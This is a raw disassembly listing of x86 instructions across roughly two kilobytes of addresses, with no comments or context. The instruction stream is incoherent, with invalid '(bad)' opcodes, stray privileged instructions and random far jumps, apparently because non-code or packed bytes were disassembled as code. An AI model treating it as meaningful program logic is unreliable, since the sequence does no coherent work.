  41e861:	scas   al,BYTE PTR es:[edi]
  41e862:	adc    BYTE PTR [edx-0x5591a55a],ch
  41e868:	neg    BYTE PTR [edi-0x36dc1027]
  41e86e:	adc    esp,DWORD PTR [ebp-0x2e206024]
  41e874:	retf   0x6b98
  41e877:	inc    ecx
  41e878:	jp     0x41e8cc
  41e87a:	es mov ah,0x69
  41e87d:	je     0x41e8b8
  41e87f:	icebp  
  41e880:	sub    dh,BYTE PTR [ecx+0x117744b5]
  41e886:	test   al,0x3f
  41e888:	push   esp
  41e889:	pop    ss
  41e88a:	mov    eax,cs:0x302ae14c
  41e890:	(bad)
  41e893:	xchg   ecx,eax
  41e894:	pop    ds
  41e895:	dec    eax
  41e896:	push   eax
  41e897:	sbb    ebx,DWORD PTR [eax]
  41e899:	mov    esi,0xa7f7dadb
  41e89e:	pop    eax
  41e89f:	lods   al,BYTE PTR ds:[esi]
  41e8a0:	jecxz  0x41e8bb
  41e8a2:	jno    0x41e907
  41e8a4:	inc    edi
  41e8a5:	xor    al,0xb
  41e8a7:	loope  0x41e838
  41e8a9:	mov    edi,edi
  41e8ab:	or     al,BYTE PTR [edx]
  41e8ad:	sbb    BYTE PTR [eax+0xf3f1e87],al
  41e8b3:	sub    bl,ah
  41e8b5:	stos   DWORD PTR es:[edi],eax
  41e8b6:	dec    esi
  41e8b7:	int3   
  41e8b8:	lods   eax,DWORD PTR ds:[esi]
  41e8b9:	inc    ebp
  41e8ba:	add    eax,0x4961fe36
  41e8bf:	jp     0x41e899
  41e8c1:	lods   eax,DWORD PTR ds:[esi]
  41e8c2:	jb     0x41e906
  41e8c4:	fidivr DWORD PTR [ebx+0x62]
  41e8c7:	cmp    DWORD PTR [edi],edx
  41e8c9:	mov    edx,0xbe308687
  41e8ce:	test   DWORD PTR [eax+0x1ac7e6de],edi
  41e8d4:	push   esi
  41e8d5:	cmp    bl,BYTE PTR [esi]
  41e8d7:	push   edi
  41e8d8:	call   0x1686:0x775525dd
  41e8df:	adc    DWORD PTR [ecx],eax
  41e8e1:	and    DWORD PTR [esp+ebx*4-0x77],0x4aef5b20
  41e8e9:	cmp    eax,0x8879f1c9
  41e8ee:	lea    edi,[ecx+esi*8+0x52974a08]
  41e8f5:	mov    edx,0xb5b26116
  41e8fa:	xor    edi,DWORD PTR [ecx-0x3d]
  41e8fd:	aaa    
  41e8fe:	adc    al,0x3f
  41e900:	fnstsw WORD PTR [eax-0x2c9c06f1]
  41e906:	aam    0xc5
  41e908:	fst    DWORD PTR ds:0xf1055541
  41e90e:	jge    0x41e917
  41e910:	cmp    esi,DWORD PTR [ecx]
  41e912:	jns    0x41e939
  41e914:	and    BYTE PTR [esi+ecx*2+0x1d520c15],bh
  41e91b:	das    
  41e91c:	in     al,0x68
  41e91e:	pop    edi
  41e91f:	cmp    cl,BYTE PTR [ecx-0x7e]
  41e922:	cli    
  41e923:	mov    al,BYTE PTR [edx+0x6b541a2]
  41e929:	push   0xfffffff7
  41e92b:	ret    0xafa1
  41e92e:	sub    BYTE PTR [edi+ecx*4+0x33109293],ah
  41e935:	retf   0xd9f2
  41e938:	ins    DWORD PTR es:[edi],dx
  41e939:	inc    esp
  41e93a:	push   0x2f3ab08c
  41e93f:	adc    al,BYTE PTR [ecx+0xb]
  41e942:	js     0x41e969
  41e944:	add    BYTE PTR [ebp+0x2c],bh
  41e947:	xchg   edx,eax
  41e948:	les    edi,FWORD PTR [ebx-0x59]
  41e94b:	sbb    eax,0xc43664cb
  41e950:	or     eax,0x7ff7aec7
  41e955:	sub    esp,DWORD PTR [ecx-0x54]
  41e958:	iret   
  41e959:	enter  0x7581,0xa1
  41e95d:	pop    ds
  41e95e:	lea    eax,[ecx+0x5d]
  41e961:	clc    
  41e962:	imul   esp,DWORD PTR [eax-0x6e],0x19fed8d5
  41e969:	ficom  DWORD PTR [ebx+0x25ad8d25]
  41e96f:	loop   0x41e948
  41e971:	jno    0x41e96d
  41e973:	adc    BYTE PTR [eax],dl
  41e975:	mov    WORD PTR [ebp+0x43bea8d3],ds
  41e97b:	lds    ecx,FWORD PTR [ecx]
  41e97d:	push   edi
  41e97e:	mov    ds:0x9390eea5,eax
  41e983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e984:	cli    
  41e985:	inc    ebx
  41e986:	mov    ss,WORD PTR [edx+0x5588c649]
  41e98c:	sub    al,0xa5
  41e98e:	cwde   
  41e98f:	js     0x41e9fe
  41e991:	imul   ecx,ecx,0x33
  41e994:	pop    ecx
  41e995:	dec    edx
  41e996:	ins    BYTE PTR es:[edi],dx
  41e997:	and    eax,0x75032e32
  41e99c:	xor    ah,BYTE PTR [edx]
  41e99e:	sub    bl,BYTE PTR [ebx]
  41e9a0:	shl    al,0xb
  41e9a3:	inc    edi
  41e9a4:	daa    
  41e9a5:	or     BYTE PTR [edx+0xcc6a8e0],0xc0
  41e9ac:	push   eax
  41e9ad:	out    dx,al
  41e9ae:	(bad)  
  41e9af:	or     eax,0xdfb9ccad
  41e9b4:	fdiv   DWORD PTR ds:0x56591781
  41e9ba:	push   es
  41e9bb:	add    eax,0xb067f89a
  41e9c0:	bound  ecx,QWORD PTR [ebp-0x15]
  41e9c3:	fwait
  41e9c4:	retf   0x7d81
  41e9c7:	jne    0x41e9da
  41e9c9:	cmp    esi,0x3e
  41e9cc:	cmp    DWORD PTR [edi-0x4d8e2cb4],edx
  41e9d2:	dec    edi
  41e9d3:	mov    dl,0xc
  41e9d5:	mov    al,0x8
  41e9d7:	iret   
  41e9d8:	pop    esp
  41e9d9:	lods   al,BYTE PTR ds:[esi]
  41e9da:	pop    ss
  41e9db:	push   ss
  41e9dc:	xchg   ebp,eax
  41e9dd:	sub    al,0x6
  41e9df:	sbb    esi,DWORD PTR [edx]
  41e9e1:	mov    edx,0x5499de2b
  41e9e6:	xor    eax,DWORD PTR [edi-0x55]
  41e9e9:	enter  0xc74c,0xff
  41e9ed:	sbb    al,0x41
  41e9ef:	mov    ebp,0x545f86e5
  41e9f4:	daa    
  41e9f5:	imul   DWORD PTR [edi-0x56832472]
  41e9fb:	push   edi
  41e9fc:	jecxz  0x41e9ce
  41e9fe:	mov    ch,0x3d
  41ea00:	fst    DWORD PTR [ecx]
  41ea02:	in     al,0x63
  41ea04:	jno    0x41e99d
  41ea06:	aam    0xec
  41ea08:	(bad)  
  41ea09:	sub    al,0x80
  41ea0b:	cmp    bl,BYTE PTR [esi+0x77b1a87d]
  41ea11:	sub    dh,ch
  41ea13:	or     eax,eax
  41ea15:	stc    
  41ea16:	ins    DWORD PTR es:[edi],dx
  41ea17:	sbb    ebx,esp
  41ea19:	jge    0x41ea1f
  41ea1b:	cmp    DWORD PTR [edx+0x51],ebx
  41ea1e:	push   cs
  41ea1f:	sbb    al,0x7e
  41ea21:	outs   dx,DWORD PTR ds:[esi]
  41ea22:	mov    ecx,0xa912c43d
  41ea27:	jne    0x41ea50
  41ea29:	outs   dx,BYTE PTR ds:[esi]
  41ea2a:	mov    DWORD PTR [edi-0x78],ecx
  41ea2d:	xor    cl,BYTE PTR [esi]
  41ea2f:	pushf  
  41ea30:	scas   al,BYTE PTR es:[edi]
  41ea31:	sbb    ecx,DWORD PTR [edi]
  41ea33:	pop    ebx
  41ea34:	sub    DWORD PTR [ebx],eax
  41ea36:	aas    
  41ea37:	dec    edi
  41ea38:	idiv   ecx
  41ea3a:	and    al,0xb
  41ea3c:	je     0x41e9d8
  41ea3e:	xor    eax,0xc6799d94
  41ea43:	mov    bl,0x2b
  41ea45:	pushf  
  41ea46:	aas    
  41ea47:	add    ch,BYTE PTR [ecx]
  41ea49:	fimul  WORD PTR [eax-0x72492e4c]
  41ea4f:	jbe    0x41eabd
  41ea51:	mov    edi,0xe7f8be9e
  41ea56:	pusha  
  41ea57:	jmp    0x41e9e7
  41ea59:	sub    eax,0x3b81ae6a
  41ea5e:	add    BYTE PTR [esi+0x2e139d72],ah
  41ea64:	mov    eax,ds:0xffa548dd
  41ea69:	mov    cl,0x1
  41ea6b:	test   al,0x1a
  41ea6d:	or     BYTE PTR [esi+0x181057ad],dl
  41ea73:	pop    edi
  41ea74:	bound  esi,QWORD PTR [ecx]
  41ea76:	cmc    
  41ea77:	and    DWORD PTR [eax],edi
  41ea79:	jmp    0x2d1fa41
  41ea7e:	rdtsc  
  41ea80:	stos   DWORD PTR es:[edi],eax
  41ea81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea82:	mov    ds:0x5ef2b4de,al
  41ea87:	lahf   
  41ea88:	mov    bl,0x97
  41ea8a:	stos   DWORD PTR es:[edi],eax
  41ea8b:	retf   
  41ea8c:	and    eax,0x949d9a3
  41ea91:	fst    DWORD PTR [ebx-0x5db32aee]
  41ea97:	dec    ecx
  41ea98:	icebp  
  41ea99:	xor    edi,0x55575b1
  41ea9f:	jmp    0x41eb09
  41eaa1:	imul   esi,DWORD PTR [eax],0x1ad9400a
  41eaa7:	jle    0x41eaf4
  41eaa9:	mov    bl,0xfe
  41eaab:	shl    DWORD PTR [edi-0x66b28fb6],cl
  41eab1:	lahf   
  41eab2:	loope  0x41ead6
  41eab4:	pushf  
  41eab5:	(bad)  
  41eab6:	idiv   BYTE PTR [edx+esi*8-0x55cbf749]
  41eabd:	or     al,0x83
  41eabf:	cld    
  41eac0:	adc    eax,0x9bd72c2c
  41eac5:	popa   
  41eac6:	icebp  
  41eac7:	fnsave [ebp+edi*2+0x4e7c2a27]
  41eace:	jle    0x41ea93
  41ead0:	dec    eax
  41ead1:	push   esp
  41ead2:	das    
  41ead3:	dec    esp
  41ead4:	(bad)  
  41ead5:	stc    
  41ead6:	jl     0x41ead6
  41ead8:	sbb    dh,BYTE PTR [esi]
  41eada:	je     0x41eaf7
  41eadc:	push   ebp
  41eadd:	add    al,0x4f
  41eadf:	fptan  
  41eae1:	adc    eax,DWORD PTR [ebp+eiz*4+0x4a]
  41eae5:	ins    BYTE PTR es:[edi],dx
  41eae6:	ins    BYTE PTR es:[edi],dx
  41eae7:	sbb    al,BYTE PTR ds:0x64ed36c0
  41eaed:	jg     0x41eafe
  41eaef:	xor    esp,DWORD PTR [edx-0x23a67aa1]
  41eaf5:	adc    DWORD PTR ds:0xa68935cb,ebp
  41eafb:	dec    ecx
  41eafc:	sar    DWORD PTR [ebx*4-0x3da23ee],cl
  41eb03:	mov    eax,ds:0xb34899a
  41eb08:	aam    0x9c
  41eb0a:	movnti DWORD PTR [edx+0x33eb5584],esp
  41eb11:	ja     0x41eb92
  41eb13:	hlt    
  41eb14:	popa   
  41eb15:	pop    esp
  41eb16:	fimul  WORD PTR fs:[ebp+0x76]
  41eb1a:	or     edx,DWORD PTR [esi+eax*4+0x7f]
  41eb1e:	sub    DWORD PTR [ebx-0x503c534b],0x10
  41eb25:	pop    ss
  41eb26:	pop    esi
  41eb27:	scas   al,BYTE PTR es:[edi]
  41eb28:	sbb    ch,BYTE PTR [eax+0x29]
  41eb2b:	jae    0x41eb41
  41eb2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb2e:	test   al,0x84
  41eb30:	dec    ebx
  41eb31:	ror    DWORD PTR [edi-0x117d5b32],0xab
  41eb38:	mov    bh,0xa4
  41eb3a:	pop    ecx
  41eb3b:	xor    BYTE PTR [ebx-0x167aeb3b],ah
  41eb41:	(bad)  
  41eb42:	out    dx,eax
  41eb43:	dec    ecx
  41eb44:	push   0xffffffa2
  41eb46:	imul   ecx,DWORD PTR [ecx+edx*8],0x80ddf5c3
  41eb4d:	mov    ?,WORD PTR [si-0x64]
  41eb51:	push   ebp
  41eb52:	cmp    BYTE PTR [edi-0x67],ch
  41eb55:	in     eax,0x37
  41eb57:	jecxz  0x41eb59
  41eb59:	mov    ebp,0x462cc7fb
  41eb5e:	mov    edx,0xa7da1bf7
  41eb63:	push   ebp
  41eb64:	adc    dh,BYTE PTR [esi+eiz*4-0x1161d9b0]
  41eb6b:	jge    0x41eb04
  41eb6d:	dec    ebx
  41eb6e:	sub    DWORD PTR [esi+0xc],0x4b
  41eb72:	cmp    al,0x13
  41eb74:	in     eax,dx
  41eb75:	lods   al,BYTE PTR ds:[esi]
  41eb76:	sub    al,0xd
  41eb78:	mov    BYTE PTR [esi+0x597587a8],dh
  41eb7e:	adc    esp,DWORD PTR [edx]
  41eb80:	rcl    BYTE PTR [edx+0x67ed0421],cl
  41eb86:	inc    esi
  41eb87:	dec    esi
  41eb88:	std    
  41eb89:	sub    ch,BYTE PTR [edi+0x3b]
  41eb8c:	sti    
  41eb8d:	lods   al,BYTE PTR ds:[esi]
  41eb8e:	push   ebp
  41eb8f:	daa    
  41eb90:	loopne 0x41eb20
  41eb92:	or     al,0x76
  41eb94:	pushf  
  41eb95:	xchg   edi,eax
  41eb96:	fistp  WORD PTR [eax-0x44]
  41eb99:	sub    eax,0x894b576d
  41eb9e:	cmp    BYTE PTR [ebp+0x245308a6],al
  41eba4:	and    eax,0x9d57fcca
  41eba9:	fmul   st(7),st
  41ebab:	mov    ah,0xf0
  41ebad:	cdq    
  41ebae:	or     eax,0xadae0172
  41ebb3:	mov    ebp,0x597718e
  41ebb8:	mov    cl,0xe9
  41ebba:	xchg   ebp,eax
  41ebbb:	jle    0x41ebd8
  41ebbd:	fimul  DWORD PTR [edi+0x14]
  41ebc0:	adc    ebp,DWORD PTR [ebx]
  41ebc2:	hlt    
  41ebc3:	add    eax,0x86b4eb04
  41ebc8:	aam    0x9a
  41ebca:	inc    ebp
  41ebcb:	cdq    
  41ebcc:	add    bl,BYTE PTR [eax]
  41ebce:	sti    
  41ebcf:	push   ecx
  41ebd0:	push   ebx
  41ebd1:	loop   0x41ec49
  41ebd3:	and    BYTE PTR [edx+ebx*2-0x74314572],al
  41ebda:	push   es
  41ebdb:	jb     0x41ec55
  41ebdd:	shl    DWORD PTR [edx],0xdc
  41ebe0:	dec    esp
  41ebe1:	adc    DWORD PTR ds:0x5e9366ff,0xb5ce417b
  41ebeb:	pop    es
  41ebec:	jbe    0x41eb90
  41ebee:	jecxz  0x41eb95
  41ebf0:	jne    0x41ec4c
  41ebf2:	mov    dh,BYTE PTR [ecx+0x46]
  41ebf5:	push   eax
  41ebf6:	pushf  
  41ebf7:	add    cl,dh
  41ebf9:	stos   DWORD PTR es:[edi],eax
  41ebfa:	(bad)  
  41ebfc:	adc    al,0x56
  41ebfe:	rol    BYTE PTR [edx-0x73],0xdd
  41ec02:	outs   dx,BYTE PTR ds:[esi]
  41ec03:	cmp    bh,dh
  41ec05:	jmp    0x41ebcc
  41ec07:	mov    dl,0x68
  41ec09:	mov    eax,0xec23f29c
  41ec0e:	and    DWORD PTR [esi+0x790472ba],edi
  41ec14:	push   edi
  41ec15:	mov    bh,0x51
  41ec17:	in     al,dx
  41ec18:	adc    al,0x71
  41ec1a:	pop    ds
  41ec1b:	sbb    cl,ch
  41ec1d:	jle    0x41ec4b
  41ec1f:	shl    DWORD PTR [edi],cl
  41ec21:	out    dx,eax
  41ec22:	push   esi
  41ec23:	or     DWORD PTR [ecx+0x8],edx
  41ec26:	std    
  41ec27:	or     DWORD PTR [ebx-0x73380918],ebp
  41ec2d:	cld    
  41ec2e:	or     cl,al
  41ec30:	aaa    
  41ec31:	test   eax,0x88d61e38
  41ec36:	into   
  41ec37:	sub    al,0xaf
  41ec39:	push   ss
  41ec3a:	xchg   esp,eax
  41ec3b:	xchg   cl,ah
  41ec3d:	or     ecx,DWORD PTR [edi]
  41ec3f:	mov    ds:0x6c6da2e1,eax
  41ec44:	inc    eax
  41ec45:	xchg   esi,eax
  41ec46:	and    eax,0x6bdae6b0
  41ec4b:	xor    dl,bh
  41ec4d:	outs   dx,DWORD PTR ds:[esi]
  41ec4e:	and    ah,BYTE PTR [edi-0x32da2902]
  41ec54:	dec    ebp
  41ec55:	(bad)  
  41ec56:	fisubr DWORD PTR [edx-0x8afcdf6]
  41ec5c:	adc    BYTE PTR [ebx+0x7f],ah
  41ec5f:	test   DWORD PTR [edx+0x6d],eax
  41ec62:	mul    DWORD PTR [ecx]
  41ec64:	mov    WORD PTR [edi+0x39],cs
  41ec67:	jg     0x41ecc7
  41ec69:	jg     0x41ec9b
  41ec6b:	out    dx,al
  41ec6c:	lea    ecx,[eax-0x46]
  41ec6f:	jns    0x41ec25
  41ec71:	gs xchg edx,eax
  41ec73:	xor    al,0x24
  41ec75:	out    0xf6,eax
  41ec77:	push   edi
  41ec78:	inc    esi
  41ec79:	outs   dx,DWORD PTR ds:[esi]
  41ec7a:	retf   0xf5a4
  41ec7d:	addr16 (bad) 
  41ec7f:	test   eax,0x50bc12e2
  41ec84:	or     cl,BYTE PTR [edi-0x58]
  41ec87:	pop    esi
  41ec88:	push   ds
  41ec89:	jl     0x41ec55
  41ec8b:	lods   eax,DWORD PTR ds:[esi]
  41ec8c:	fisttp DWORD PTR [ebp+ecx*2+0x493a9f32]
  41ec93:	pop    ebp
  41ec94:	adc    eax,0xf4f11857
  41ec99:	mov    cl,0x75
  41ec9b:	inc    ecx
  41ec9c:	daa    
  41ec9d:	addr16 data16 cmc 
  41eca0:	stos   DWORD PTR es:[edi],eax
  41eca1:	fadd   DWORD PTR ds:0xca9f9287
  41eca8:	sbb    eax,0x39408194
  41ecad:	leave  
  41ecae:	pop    esi
  41ecaf:	add    eax,0x518d3864
  41ecb4:	xor    ebx,esp
  41ecb6:	inc    ecx
  41ecb7:	adc    ch,BYTE PTR [eax+0x59644417]
  41ecbd:	or     esi,DWORD PTR [ecx]
  41ecbf:	hlt    
  41ecc0:	add    BYTE PTR [eax],dl
  41ecc2:	add    BYTE PTR [edi+edx*1+0x1e],0x7c
  41ecc7:	mov    dl,BYTE PTR [esi+0x8ce4ffc]
  41eccd:	push   edi
  41ecce:	sub    BYTE PTR [ecx+0x159f524e],bh
  41ecd4:	inc    esi
  41ecd5:	xor    DWORD PTR [eax-0x38517967],0xf03fe737
  41ecdf:	xor    ecx,ebx
  41ece1:	ror    BYTE PTR [ecx],1
  41ece3:	in     al,0x10
  41ece5:	xor    dh,dl
  41ece7:	repnz test DWORD PTR [eax],0x631f4cfa
  41ecee:	stos   BYTE PTR es:[edi],al
  41ecef:	lods   al,BYTE PTR ds:[esi]
  41ecf0:	cmp    al,0xd2
  41ecf2:	imul   ebp,DWORD PTR [eax],0x3fe84fbc
  41ecf8:	in     eax,dx
  41ecf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecfa:	inc    esi
  41ecfb:	pop    es
  41ecfc:	dec    edi
  41ecfd:	popf   
  41ecfe:	iret   
  41ecff:	(bad)  
  41ed00:	mov    esi,0x4c59d6b
  41ed05:	test   DWORD PTR [ebp-0x34dc5061],edx
  41ed0b:	inc    edi
  41ed0c:	rcr    DWORD PTR [esp+ebx*2+0x27],0x76
  41ed11:	xor    edi,DWORD PTR [ebx+0x7]
  41ed14:	push   edx
  41ed15:	jno    0x41ed67
  41ed17:	jmp    0xa15e:0x4bf261a0
  41ed1e:	test   al,0x10
  41ed20:	imul   edx,DWORD PTR [eax+0x13481e4a],0x4d12010f
  41ed2a:	nop
  41ed2b:	cwde   
  41ed2c:	scas   eax,DWORD PTR es:[edi]
  41ed2d:	mov    cl,0xa8
  41ed2f:	neg    esp
  41ed31:	inc    eax
  41ed32:	inc    DWORD PTR [eax-0x61f38dd4]
  41ed38:	sbb    eax,0xd6f8f30f
  41ed3d:	dec    ebx
  41ed3e:	mov    ds:0x10181681,al
  41ed43:	dec    ebp
  41ed44:	add    al,0x64
  41ed46:	shr    BYTE PTR [ebp-0x1cf55a0d],0x89
  41ed4d:	adc    eax,0x6d09a704
  41ed52:	mov    ebp,0x1412e97d
  41ed57:	inc    eax
  41ed58:	sbb    edi,edx
  41ed5a:	(bad)  
  41ed5b:	out    dx,al
  41ed5c:	pop    edi
  41ed5d:	cmp    eax,0xb004d4a7
  41ed62:	fidiv  DWORD PTR [esi-0x54]
  41ed65:	and    BYTE PTR [edi+eiz*2-0x4a],ch
  41ed69:	fcomp  QWORD PTR [esi+0x2a8fede1]
  41ed6f:	int3   
  41ed70:	std    
  41ed71:	sub    BYTE PTR [ebx+ecx*1],ch
  41ed74:	outs   dx,BYTE PTR ds:[esi]
  41ed75:	jb     0x41eda6
  41ed77:	test   BYTE PTR [ebx+0x2d],dl
  41ed7a:	xchg   BYTE PTR [esi-0x20241ce9],cl
  41ed80:	loop   0x41edd0
  41ed82:	inc    ebp
  41ed83:	jo     0x41ed46
  41ed85:	sub    al,0x75
  41ed87:	fwait
  41ed88:	pop    ebx
  41ed89:	je     0x41ede5
  41ed8b:	popa   
  41ed8c:	xor    eax,0x38d73c71
  41ed91:	jecxz  0x41ed91
  41ed93:	je     0x41ed7d
  41ed95:	xchg   dh,dl
  41ed97:	popf   
  41ed98:	jb     0x41edd5
  41ed9a:	lods   eax,DWORD PTR ds:[esi]
  41ed9b:	int3   
  41ed9c:	adc    eax,0x7e117354
  41eda1:	jb     0x41ed66
  41eda3:	push   edi
  41eda4:	ret    
  41eda5:	dec    eax
  41eda6:	gs push ebp
  41eda8:	or     edx,esp
  41edaa:	sbb    edx,DWORD PTR fs:[edi+0x70]
  41edae:	sub    edx,DWORD PTR [eax+ebx*1+0x9]
  41edb2:	adc    DWORD PTR [edx+ebp*8+0x63],esp
  41edb6:	sbb    edi,DWORD PTR [eax+0x4655daeb]
  41edbc:	js     0x41edbc
  41edbe:	ins    DWORD PTR es:[edi],dx
  41edbf:	clc    
  41edc0:	idiv   DWORD PTR [eax+0x92c9afc]
  41edc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edc7:	mov    bl,BYTE PTR [edi+0x282d3d2e]
  41edcd:	inc    ebp
  41edce:	cmp    eax,0x68b0b5ef
  41edd3:	scas   eax,DWORD PTR es:[edi]
  41edd4:	and    eax,0xe53bde36
  41edd9:	and    eax,0xb54a20a1
  41edde:	pop    ebx
  41eddf:	jge    0x41edfe
  41ede1:	xor    BYTE PTR [ecx+ebp*2+0x1cdd8cd2],ah
  41ede8:	outs   dx,DWORD PTR ds:[esi]
  41ede9:	(bad)  
  41edea:	xor    al,0x9c
  41edec:	xor    ebx,DWORD PTR [edi]
  41edee:	int3   
  41edef:	cmp    ebx,DWORD PTR [edi]
  41edf1:	push   0xffffffab
  41edf3:	int    0x7
  41edf5:	int3   
  41edf6:	cdq    
  41edf7:	icebp  
  41edf8:	nop
  41edf9:	(bad)  
  41edfa:	fcmovnb st,st(7)
  41edfc:	popa   
  41edfd:	pop    edi
  41edfe:	push   esp
  41edff:	loop   0x41ee22
  41ee01:	jmp    0x9e46:0xe5f76d00
  41ee08:	mov    WORD PTR [ebx],gs
  41ee0a:	add    eax,0x432b0381
  41ee0f:	movq   mm0,mm2
  41ee12:	in     eax,dx
  41ee13:	outs   dx,BYTE PTR ds:[esi]
  41ee14:	add    ebx,DWORD PTR [esi+0x20]
  41ee17:	jb     0x41ee12
  41ee19:	loope  0x41edad
  41ee1b:	adc    BYTE PTR [ecx],bh
  41ee1d:	jne    0x41ee19
  41ee1f:	mov    ebp,0x333242ee
  41ee24:	xchg   ebp,ebp
  41ee26:	jle    0x41edc4
  41ee28:	dec    edi
  41ee29:	sub    eax,0xb4e2e726
  41ee2e:	mov    edi,0xcbd4ef9d
  41ee33:	push   eax
  41ee34:	(bad)  
  41ee35:	ins    BYTE PTR es:[edi],dx
  41ee36:	jb     0x41edc2
  41ee38:	cmc    
  41ee39:	sub    BYTE PTR [esi-0x291a6a8e],dh
  41ee3f:	in     al,0x6c
  41ee41:	popf   
  41ee42:	mov    WORD PTR [ecx],?
  41ee44:	mov    esp,0xe23fcb2
  41ee49:	push   ebx
  41ee4a:	jne    0x41ede4
  41ee4c:	dec    edi
  41ee4d:	stos   DWORD PTR es:[edi],eax
  41ee4e:	mov    ebx,0x9890c520
  41ee53:	xor    DWORD PTR ds:0x7b83dc99,ebx
  41ee59:	js     0x41edfe
  41ee5b:	push   cs
  41ee5c:	sbb    al,0x62
  41ee5e:	fld    QWORD PTR [edi+0x55]
  41ee61:	inc    ebx
  41ee62:	dec    edi
  41ee63:	mov    ebx,0x72f16963
  41ee68:	push   0xbfc888af
  41ee6d:	jb     0x41ee8c
  41ee6f:	mov    cl,0xf3
  41ee71:	cs or  edx,ebp
  41ee74:	xchg   BYTE PTR [ebp+0x40],bl
  41ee77:	cmp    al,0xa7
  41ee79:	ret    
  41ee7a:	and    DWORD PTR [edi],ebp
  41ee7c:	mov    ds:0x566b53d,eax
  41ee81:	repnz mov eax,ds:0x6b9f1cd8
  41ee87:	outs   dx,BYTE PTR ds:[esi]
  41ee88:	mov    al,ah
  41ee8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee8b:	sub    BYTE PTR [edi+0x3b],cl
  41ee8e:	jg     0x41ee66
  41ee90:	mov    cl,0xf3
  41ee92:	data16 jbe 0x41ef14
  41ee95:	mov    edi,0x8e83af0b
  41ee9a:	xor    edi,DWORD PTR [ebx+0x33947ce2]
  41eea0:	retf   
  41eea1:	aaa    
  41eea2:	inc    ebp
  41eea3:	jns    0x41eeb4
  41eea5:	dec    ebx
  41eea6:	dec    edi
  41eea7:	inc    ecx
  41eea8:	mov    ah,0x89
  41eeaa:	das    
  41eeab:	dec    ecx
  41eeac:	pop    ds
  41eead:	fbld   TBYTE PTR [esi+ecx*2-0x7e]
  41eeb1:	mov    ah,0xe7
  41eeb3:	adc    ebx,0xffffff89
  41eeb6:	mov    DWORD PTR [edx-0x1090907c],edx
  41eebc:	and    eax,0xbd56a14c
  41eec1:	push   eax
  41eec2:	jae    0x41ee99
  41eec4:	fcmovnbe st,st(2)
  41eec6:	sub    al,0x31
  41eec8:	mov    ebp,gs
  41eeca:	js     0x41ee50
  41eecc:	rcl    al,1
  41eece:	sub    ebx,DWORD PTR [edx+0x369f3d72]
  41eed4:	cmp    dh,BYTE PTR [ebp+0x772cb570]
  41eeda:	out    dx,al
  41eedb:	mov    WORD PTR [edx],ss
  41eedd:	push   edx
  41eede:	das    
  41eedf:	mov    fs,WORD PTR ds:[esi]
  41eee2:	ret    0x5e80
  41eee5:	jg     0x41ef3e
  41eee7:	mov    dl,0xeb
  41eee9:	fisttp QWORD PTR ds:0x9d31b716
  41eeef:	push   ebx
  41eef0:	push   0xffffffb0
  41eef2:	clc    
  41eef3:	dec    esp
  41eef4:	inc    edi
  41eef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef6:	mov    ds:0x400fe81f,eax
  41eefb:	and    edi,DWORD PTR [edi]
  41eefd:	rcr    edi,1
  41eeff:	push   cs
  41ef00:	ss ret 0x7372
  41ef04:	lods   eax,DWORD PTR ds:[esi]
  41ef05:	fimul  WORD PTR ds:0x2b699479
  41ef0b:	mov    bh,0xfc
  41ef0d:	add    eax,0x63becf77
  41ef12:	ror    DWORD PTR [ecx-0x279d68c5],1
  41ef18:	daa    
  41ef19:	jmp    0xd0ec1e88
  41ef1e:	pop    ss
  41ef1f:	inc    edi
  41ef20:	dec    ebx
  41ef21:	dec    DWORD PTR [edi+0x58]
  41ef24:	pop    esi
  41ef25:	inc    edi
  41ef26:	in     eax,dx
  41ef27:	pusha  
  41ef28:	mov    ecx,0xa968aeab
  41ef2d:	fs push cs
  41ef2f:	adc    BYTE PTR [edi+edx*8-0x7d4cfe2a],al
  41ef36:	call   0xbda9:0x56cc4f93
  41ef3d:	out    0x8a,eax
  41ef3f:	mov    WORD PTR [edx],ds
  41ef41:	or     ebx,DWORD PTR [ecx+ebx*8-0x40b645b2]
  41ef48:	in     eax,0x4b
  41ef4a:	cmp    eax,0x54e996de
  41ef4f:	cmp    ecx,DWORD PTR [edi+0x4ee55a94]
  41ef55:	xchg   BYTE PTR [edi],dh
  41ef57:	ret    0x8eee
  41ef5a:	fisub  DWORD PTR [esi+0x7]
  41ef5d:	jmp    0x321a:0x4b08414
  41ef64:	aas    
  41ef65:	call   0x49b3:0xed148443
  41ef6c:	test   eax,0xf1d409a4
  41ef71:	add    ch,BYTE PTR [ecx+0x316f085a]
  41ef77:	or     edx,DWORD PTR [esi]
  41ef79:	mov    dh,BYTE PTR [ebx+esi*2-0x61aa7f]
  41ef80:	mov    esp,0x86e7da44
  41ef85:	js     0x41ef93
  41ef87:	ficom  WORD PTR [esi+0x7]
  41ef8a:	xor    bh,BYTE PTR [ecx]
  41ef8c:	push   edi
  41ef8d:	adc    dh,ah
  41ef8f:	push   ss
  41ef90:	mov    BYTE PTR ds:0x8bb8ea9f,ah
  41ef96:	ins    BYTE PTR es:[edi],dx
  41ef97:	aas    
  41ef98:	jne    0x41f016
  41ef9a:	push   0xffffffd9
  41ef9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef9d:	dec    ebx
  41ef9e:	in     eax,0xd5
  41efa0:	ror    BYTE PTR [eax+0x68],cl
  41efa3:	xor    al,0xdf
  41efa5:	xchg   ecx,eax
  41efa6:	inc    eax
  41efa7:	retf   
  41efa8:	inc    edx
  41efa9:	add    edi,DWORD PTR [edi+0x74c6c3da]
  41efaf:	xor    esi,DWORD PTR [eax+0x2e]
  41efb2:	mov    BYTE PTR [esi-0x3e619ce8],dh
  41efb8:	mov    edi,0x7bb88951
  41efbd:	sbb    al,0x4
  41efbf:	imul   ebx,DWORD PTR [edx],0xaefb69cc
  41efc5:	int3   
  41efc6:	jae    0x41f013
  41efc8:	ds adc al,0x54
  41efcb:	pushf  
  41efcc:	or     DWORD PTR [ebx-0x18],0xffffffb3
  41efd0:	dec    ebx
  41efd1:	aaa    
  41efd2:	shr    BYTE PTR [ebx],1
  41efd4:	sub    eax,0x557bed8b
  41efd9:	pop    esp
  41efda:	neg    BYTE PTR [edi-0xfdac429]
